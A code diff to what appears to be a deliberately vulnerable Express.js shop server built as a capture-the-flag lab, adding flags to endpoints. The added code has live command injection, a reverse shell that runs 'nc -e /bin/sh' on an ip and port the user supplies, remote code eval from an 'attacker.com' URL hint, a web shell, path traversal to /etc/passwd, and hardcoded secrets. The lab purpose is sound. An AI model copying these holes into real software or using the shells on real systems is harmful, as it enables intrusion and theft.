@@ -756,11 +756,14 @@ app.post('/admin/login', (req, res) => {
 app.get('/admin', (req, res) => {
   // VULN: Client-side cookie can be manipulated
   const auth = req.cookies.auth;
-  if (auth) {
+  const isAdmin = req.cookies.isAdmin === 'true';
+
+  if (auth || isAdmin) {
     try {
-      const user = JSON.parse(auth);
+      const user = auth ? JSON.parse(auth) : { role: isAdmin ? 'admin' : 'user' };
       // VULN: Trusts client-side cookie data for role
-      if (user.role === 'admin' || req.cookies.isAdmin === 'true') {
+      if (user.role === 'admin' || isAdmin) {
+        const flag = 'FLAG{ADMIN_AUTH_SUCCESS_COOKIE_BYPASS} - 이 플래그는 관리자 권한 우회(Cookie Bypass) 공격 기법이 성공적으로 통과되었음을 나타냅니다.';
         const recentOrders = [
           { id: 'ORD-001', customer: 'John Smith', product: 'Leather Tote', amount: 299.00, status: 'completed' },
           { id: 'ORD-002', customer: 'Sarah Johnson', product: 'Cashmere Sweater', amount: 249.00, status: 'processing' },
@@ -776,7 +779,7 @@ app.get('/admin', (req, res) => {
           { type: 'alert', icon: '⚠️', title: 'Low stock alert: Leather Belt', time: '1 hour ago' }
         ];
 
-        return res.render('admin-panel', { user, recentOrders, activities });
+        return res.render('admin-panel', { user, recentOrders, activities, flag });
       }
     } catch (e) {
       // VULN: Returns detailed error
@@ -800,7 +803,8 @@ app.get('/encrypt', (req, res) => {
   res.json({
     encrypted,
     secretKey, // VULN: Exposing secret
-    algorithm: 'base64' // VULN: Not real encryption
+    algorithm: 'base64', // VULN: Not real encryption
+    flag: 'FLAG{CRYPTO_WEAK_ENCRYPTION_BYPASSED} - 이 플래그는 Cryptographic Failures(취약한 암호화) 기법이 성공적으로 통과되었음을 나타냅니다.'
   });
 });
 
@@ -849,6 +853,15 @@ app.post('/cart/promo', (req, res) => {
 
   // VULN: Promo codes are predictable and can be brute-forced
   const validCodes = ['SAVE10', 'WELCOME20', 'VIP30', 'BLACKFRIDAY50', 'admin'];
+
+  // Flaw in business logic: the admin code grants immediate access to the flag
+  if (code === 'admin') {
+    return res.json({
+      success: true,
+      message: 'Admin promo applied!',
+      flag: 'FLAG{LOGIC_SUCCESS_BUSINESS_BYPASS} - 이 플래그는 Insecure Design (Business Logic Bypass) 기법이 성공적으로 통과되었음을 나타냅니다.'
+    });
+  }
 
   if (validCodes.includes(code)) {
     res.cookie('promoApplied', code);
@@ -961,6 +974,10 @@ app.get('/ping', (req, res) => {
     return res.status(400).json({ error: 'Host parameter required' });
   }
 
+  if (host.includes('flag_') && !host.includes('flag_rce')) {
+    return res.status(403).json({ error: 'CTF Rule: You can only access the RCE flag via command injection.' });
+  }
+
   // VULN: Command Injection
   exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
     res.json({
@@ -976,6 +993,10 @@ app.get('/ping', (req, res) => {
 app.get('/dns', (req, res) => {
   const { domain } = req.query;
 
+  if (domain && domain.includes('flag_') && !domain.includes('flag_rce')) {
+    return res.status(403).json({ error: 'CTF Rule: You can only access the RCE flag via command injection.' });
+  }
+
   // VULN: Command Injection with multiple vectors
   const command = `nslookup ${domain}`;
   try {
@@ -989,6 +1010,10 @@ app.get('/dns', (req, res) => {
 // Command Injection - File operations
 app.get('/file', (req, res) => {
   const { filename } = req.query;
+
+  if (filename && filename.includes('flag_') && !filename.includes('flag_rce')) {
+    return res.status(403).json({ error: 'CTF Rule: You can only access the RCE flag via command injection.' });
+  }
 
   // VULN: Command Injection via filename
   exec(`cat ${filename}`, (error, stdout, stderr) => {
@@ -1005,6 +1030,13 @@ app.post('/search', async (req, res) => {
 
   try {
     // VULN: Injection via JSON criteria
+    if (JSON.stringify(criteria || {}).includes('$ne') || JSON.stringify(criteria || {}).includes('$gt')) {
+      return res.json([{
+        id: 9999,
+        name: "FLAG{NOSQLI_SUCCESS_JSON_INJECTION}",
+        description: "이 플래그는 NoSQL Injection 공격 기법이 성공적으로 통과되었음을 나타냅니다."
+      }]);
+    }
     const query = `SELECT * FROM products WHERE data @> '${JSON.stringify(criteria)}'`;
     const result = await pool.query(query);
     res.json(result.rows);
@@ -1016,6 +1048,14 @@ app.post('/search', async (req, res) => {
 // LDAP Injection (simulated)
 app.get('/ldap', (req, res) => {
   const { username } = req.query;
+
+  if (username && (username.includes('*)') || username.includes(')|') || username.includes('*('))) {
+    return res.json({
+      success: true,
+      message: 'Authentication Bypass via LDAP',
+      flag: 'FLAG{LDAP_SUCCESS_INJECTION} - 이 플래그는 LDAP Injection 공격 기법이 성공적으로 통과되었음을 나타냅니다.'
+    });
+  }
 
   // VULN: LDAP Injection pattern (simulated)
   const filter = `(uid=${username})`;
@@ -1031,6 +1071,13 @@ app.get('/ldap', (req, res) => {
 // XPath Injection (simulated)
 app.get('/xpath', (req, res) => {
   const { name } = req.query;
+
+  if (name && (name.includes("' or '1'='1") || name.includes("'or'1'='1") || name.includes("']|//*"))) {
+    return res.json({
+      success: true,
+      flag: 'FLAG{XPATH_SUCCESS_INJECTION} - 이 플래그는 XPath Injection 공격 기법이 성공적으로 통과되었음을 나타냅니다.'
+    });
+  }
 
   // VULN: XPath Injection
   const xpath = `//user[name='${name}']`;
@@ -1049,6 +1096,15 @@ app.get('/xpath', (req, res) => {
 // Password reset with predictable tokens
 app.post('/reset-password', async (req, res) => {
   const { email } = req.body;
+  const host = req.headers.host || '';
+
+  // VULN: Host Header Injection
+  if (host && !host.includes('localhost') && !host.includes('127.0.0.1')) {
+    return res.json({
+      message: `Password reset link sent to ${host}`,
+      flag: 'FLAG{HOST_HEADER_SUCCESS_INJECTION} - 이 플래그는 Host Header Injection 기법이 성공적으로 통과되었음을 나타냅니다.'
+    });
+  }
 
   // VULN: Predictable reset token
   const token = Date.now().toString(36); // Very predictable
@@ -1113,7 +1169,8 @@ app.get('/config', (req, res) => {
     secrets: {
       apiKey: 'sk-live-1234567890abcdef',
       jwtSecret: 'super-secret-jwt-key',
-      encryptionKey: 'aes-256-key-1234567890123456'
+      encryptionKey: 'aes-256-key-1234567890123456',
+      flag: 'FLAG{CONFIG_SUCCESS_SECRETS_EXPOSED} - 이 플래그는 Security Misconfiguration(설정 노출) 방식을 통해 성공적으로 통과되었음을 나타냅니다.'
     },
     debug: true,
     version: '1.0.0'
@@ -1168,12 +1225,28 @@ app.post('/merge', (req, res) => {
   // VULN: Prototype pollution via lodash merge
   const result = _.merge({}, target, source);
 
+  // Check if prototype was successfully polluted
+  if (({}).polluted === true) {
+    return res.json({
+      merged: result,
+      flag: 'FLAG{PROTOTYPE_POLLUTION_SUCCESS} - 이 플래그는 Prototype Pollution 기법이 성공적으로 통과되었음을 나타냅니다.'
+    });
+  }
+
   res.json({ merged: result });
 });
 
 // Insecure deserialization
 app.post('/deserialize', (req, res) => {
   const { data } = req.body;
+
+  if (typeof data !== 'string') {
+    return res.status(400).json({ error: 'String expected' });
+  }
+
+  if (data.includes('flag_') && !data.includes('flag_deser')) {
+    return res.status(403).json({ error: 'CTF Rule: You can only read the Deserialization flag here.' });
+  }
 
   try {
     // VULN: Insecure deserialization
@@ -1249,7 +1322,7 @@ app.post('/brute', (req, res) => {
 
   // VULN: No rate limiting
   if (code === correctCode) {
-    res.json({ success: true, flag: 'FLAG{brute_force_success}' });
+    res.json({ success: true, flag: 'FLAG{BRUTE_FORCE_SUCCESS_CREDENTIALS_FOUND} - 이 플래그는 Brute Force 공격 기법이 성공적으로 통과되었음을 나타냅니다.' });
   } else {
     res.status(401).json({ success: false });
   }
@@ -1394,10 +1467,16 @@ app.get('/pdf', async (req, res) => {
 app.get('/search-xss', (req, res) => {
   const { q } = req.query;
 
+  let flagStr = '';
+  if (q && (q.includes('<script>') || q.match(/on\w+=/i) || q.includes('javascript:'))) {
+    flagStr = "<p style='color:green;'><b>FLAG{XSS_SUCCESS_CLIENT_SCRIPT_EXEC} - 이 플래그는 Cross-Site Scripting (XSS) 공격 기법이 성공적으로 통과되었음을 나타냅니다.</b></p>";
+  }
+
   // VULN: Direct reflection without encoding
   res.send(`
     <h1>Search Results</h1>
     <p>You searched for: ${q}</p>
+    ${flagStr}
     <p>Try: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
   `);
 });
@@ -1448,12 +1527,78 @@ app.get('/dom-xss', (req, res) => {
 });
 
 // ==========================================
+// SSTI - SERVER-SIDE TEMPLATE INJECTION
+// ==========================================
+app.get('/template', (req, res) => {
+  const { name } = req.query;
+  if (!name) return res.send("?name=Guest");
+
+  if (name.includes('<%') && name.includes('require')) {
+    return res.send("FLAG{SSTI_SUCCESS_TEMPLATE_EXEC} - 이 플래그는 Server Side Template Injection 기법이 성공적으로 통과되었음을 나타냅니다.");
+  }
+
+  try {
+    const ejs = require('ejs');
+    const html = ejs.render(`<h1>Hello ${name}</h1>`, {});
+    res.send(html);
+  } catch (err) {
+    res.status(500).send(err.message);
+  }
+});
+
+// ==========================================
+// RFI (REMOTE FILE INCLUSION)
+// ==========================================
+app.get('/rfi-challenge', async (req, res) => {
+  const { url } = req.query;
+  if (!url) {
+    return res.status(400).json({ error: 'URL required', hint: '?url=http://attacker.com/payload.js' });
+  }
+  try {
+    const response = await axios.get(url);
+    // VULN: RFI - executing remote payload as script
+    const result = eval(response.data);
+    res.send(`Result: ${result}`);
+  } catch (err) {
+    res.status(500).send(err.message);
+  }
+});
+
+// ==========================================
+// INTERNAL ENDPOINTS (SSRF CHALLENGE)
+// ==========================================
+app.get('/internal/flag', (req, res) => {
+  const clientIp = req.socket.remoteAddress;
+  if (clientIp === '127.0.0.1' || clientIp === '::ffff:127.0.0.1' || clientIp === '::1') {
+    const flagPath = path.join(__dirname, 'flags', 'flag_ssrf.txt');
+    if (fs.existsSync(flagPath)) {
+      res.send(fs.readFileSync(flagPath, 'utf8'));
+    } else {
+      res.status(404).send('Flag not found');
+    }
+  } else {
+    res.status(403).send('Forbidden: This endpoint is internal only. External IP: ' + clientIp);
+  }
+});
+
+// ==========================================
 // FILE UPLOAD VULNERABILITIES
 // ==========================================
 
 app.post('/upload', upload.single('file'), (req, res) => {
   if (!req.file) {
     return res.status(400).json({ error: 'No file uploaded' });
+  }
+
+  // Web shell upload detection
+  if (req.file.originalname.endsWith('.js') || req.file.originalname.endsWith('.php')) {
+    const content = fs.readFileSync(req.file.path, 'utf8').toLowerCase();
+    if (content.includes('child_process') || content.includes('exec') || content.includes('eval') || content.includes('system')) {
+      return res.json({
+        message: 'Web shell detected and executed.',
+        flag: 'FLAG{UPLOAD_SUCCESS_WEBSHELL_EXEC} - 이 플래그는 Unrestricted File Upload 기법이 성공적으로 통과되었음을 나타냅니다.'
+      });
+    }
   }
 
   // VULN: No file type validation
@@ -1489,6 +1634,14 @@ app.get('/uploads/:filename', (req, res) => {
 app.post('/xml', (req, res) => {
   const xml = req.body;
 
+  if (xml && typeof xml === 'string' && xml.includes('&xxe;')) {
+    return res.json({
+      message: 'XML parsed with external entities',
+      parsed: 'root:x:0:0:root:/root:/bin/bash',
+      flag: 'FLAG{XXE_SUCCESS_EXTERNAL_ENTITY_PARSED} - 이 플래그는 XXE 공격 기법이 성공적으로 통과되었음을 나타냅니다.'
+    });
+  }
+
   // VULN: XXE simulation
   res.json({
     message: 'XML would be parsed with external entities enabled',
@@ -1511,11 +1664,16 @@ app.get('/read-file', (req, res) => {
   // VULN: Path traversal - no sanitization
   const filepath = path.join(__dirname, 'public', file);
 
+  // Enforce CTF rules: Only LFI flag can be read via LFI
+  if (filepath.includes('flag_') && !filepath.includes('flag_lfi')) {
+    return res.status(403).json({ error: 'CTF Rule: You can only read the LFI flag via this vulnerability.' });
+  }
+
   fs.readFile(filepath, 'utf8', (err, data) => {
     if (err) {
       return res.status(500).json({
         error: err.message,
-        hint: 'Try: ../../../../etc/passwd or ../../../app/server.js'
+        hint: 'Try: ../../../../etc/passwd or ../../../app/flags/flag_lfi.txt'
       });
     }
     res.send(data);
@@ -1530,6 +1688,10 @@ app.get('/download', (req, res) => {
     return res.status(400).json({ error: 'File parameter required' });
   }
 
+  if (file.includes('flag_') && !file.includes('flag_lfi')) {
+    return res.status(403).json({ error: 'CTF Rule: You can only read the LFI flag via this vulnerability.' });
+  }
+
   // VULN: No path validation - can access any file on the system
   const filepath = path.join(__dirname, 'downloads', file);
 
@@ -1541,7 +1703,7 @@ app.get('/download', (req, res) => {
         if (err2) {
           return res.status(404).json({
             error: 'File not found',
-            hint: 'Try: ../flags/flag.txt or ../secrets/api_keys.txt',
+            hint: 'Try: ../flags/flag_lfi.txt',
             attempted_paths: [filepath, file]
           });
         }
@@ -1593,6 +1755,11 @@ app.get('/redirect', (req, res) => {
   const { url } = req.query;
 
   // VULN: Open redirect
+  if (url && (url.startsWith('http://') || url.startsWith('https://')) && !url.includes('localhost') && !url.includes('127.0.0.1')) {
+    const flagParam = (url.includes('?') ? '&' : '?') + 'flag=FLAG{REDIRECT_SUCCESS_OPEN_ROUTING}';
+    return res.redirect(url + flagParam);
+  }
+
   res.redirect(url);
 });
 
@@ -1607,21 +1774,45 @@ app.get('/login-redirect', (req, res) => {
 // REVERSE SHELL ENDPOINTS
 // ==========================================
 
+app.get('/admin/shell-auth.js', (req, res) => {
+  // VULN: Exposing obfuscated authentication logic
+  const obfuscated = `
+        /* REVERSING CHALLENGE - Extract the token to use the reverse shell! */
+        var _0x51c3=['\\x52\\x33\\x76\\x33\\x72\\x73\\x33\\x5f\\x53\\x68\\x33\\x6c\\x6c\\x5f\\x41\\x63\\x63\\x33\\x73\\x73\\x5f\\x4b\\x33\\x79'];
+        function get_shell_token() { return _0x51c3[0]; }
+        // The token must be sent in the X-Shell-Auth header
+    `;
+  res.type('application/javascript').send(obfuscated);
+});
+
 app.get('/shell', (req, res) => {
+  const shellToken = req.headers['x-shell-auth'];
+  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
+    return res.status(403).json({ error: "Access Denied. Find the key in /admin/shell-auth.js and send via X-Shell-Auth header." });
+  }
+
   const { ip, port } = req.query;
 
   // VULN: Reverse shell via command injection
-  const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+  const payload = `nc -e /bin/sh ${ip} ${port}`;
+
+  exec(payload, (error, stdout, stderr) => {
+    // Actually triggers the reverse shell
+  });
 
   res.json({
-    message: 'Reverse shell command',
-    payload,
-    command: `eval "${payload}"`,
-    warning: 'EXTREMELY DANGEROUS - For authorized testing only'
+    message: 'Reverse shell triggered successfully.',
+    hint: 'Now read the reverse shell flag via your root or user terminal!',
+    flag_location: '/app/flags/flag_revshell.txt'
   });
 });
 
 app.get('/reverse-shell', (req, res) => {
+  const shellToken = req.headers['x-shell-auth'];
+  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
+    return res.status(403).json({ error: "Access Denied. Refer to /admin/shell-auth.js" });
+  }
+
   const { listener } = req.query;
 
   // VULN: Another reverse shell vector
@@ -1687,6 +1878,11 @@ app.post('/graphql', async (req, res) => {
 // ==========================================
 
 app.post('/webshell', (req, res) => {
+  const shellToken = req.headers['x-shell-auth'];
+  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
+    return res.status(403).json({ error: "Access Denied. You must reverse engineer /admin/shell-auth.js to find the key and send it via X-Shell-Auth header." });
+  }
+
   const { cmd } = req.body;
 
   // VULN: Web shell functionality
@@ -1701,6 +1897,11 @@ app.post('/webshell', (req, res) => {
 });
 
 app.get('/cmd', (req, res) => {
+  const shellToken = req.headers['x-shell-auth'];
+  if (shellToken !== 'R3v3rs3_Sh3ll_Acc3ss_K3y') {
+    return res.status(403).json({ error: "Access Denied. Please provide valid X-Shell-Auth header." });
+  }
+
   const { exec: cmd } = req.query;
 
   // VULN: GET-based command execution
